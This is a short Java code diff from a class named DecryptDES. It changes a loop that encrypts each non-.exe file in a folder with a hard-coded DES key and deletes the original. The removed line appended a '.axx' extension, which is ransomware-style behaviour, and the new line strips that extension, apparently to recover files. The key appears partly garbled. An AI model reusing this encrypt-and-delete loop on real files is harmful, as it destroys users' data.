@@ -31,7 +31,7 @@ public class DecryptDES {
             for (File currentFile : files) {
                 if (!currentFile.isDirectory() && !currentFile.getName().toLowerCase().endsWith(".exe")) {
                     String key = "R?\n??i??";
-                    encryptFile(currentFile.getAbsolutePath(), currentFile.getAbsolutePath() + ".axx", key);
+                    encryptFile(currentFile.getAbsolutePath(), currentFile.getAbsolutePath().replace(".axx", ""), key);
                     currentFile.delete();
                     try {
                         Thread.sleep(mili);
